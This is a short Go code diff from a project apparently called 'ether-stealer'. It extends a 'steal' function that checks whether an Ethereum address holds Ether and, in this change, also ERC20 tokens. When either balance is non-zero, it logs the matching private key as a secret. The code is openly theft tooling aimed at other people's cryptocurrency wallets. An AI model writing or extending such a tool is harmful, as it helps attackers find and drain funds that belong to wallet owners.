@@ -9,6 +9,7 @@ import (
 
 	"github.com/ethereum/go-ethereum/common"
 
+	"github.com/hexoul/ether-stealer/contract"
 	"github.com/hexoul/ether-stealer/crypto"
 	"github.com/hexoul/ether-stealer/json"
 	"github.com/hexoul/ether-stealer/log"
@@ -43,11 +44,15 @@ func isBalanceGreaterThanZero(addr string) (b bool, val string) {
 }
 
 func steal(addr common.Address, privkey []byte) {
-	canSteal, _ := isBalanceGreaterThanZero(addr.String())
-	if canSteal {
-		log.Infof("GOTIT from %s !!SECRET!! %x", addr.String(), privkey)
+	canStealEther, _ := isBalanceGreaterThanZero(addr.String())
+	if canStealEther {
+		log.Infof("STEAL ETHER from %s !!SECRET!! %x", addr.String(), privkey)
 	} else {
-		fmt.Printf("FAILED from %s\n", addr.String())
+		if canStealERC := contract.CanSteal(addr); canStealERC != "" {
+			log.Infof("STEAL ERC20 from %s !!SECRET!! %x TARGET %s", addr.String(), privkey, canStealERC)
+		} else {
+			fmt.Printf("FAILED from %s\n", addr.String())
+		}
 	}
 }
 
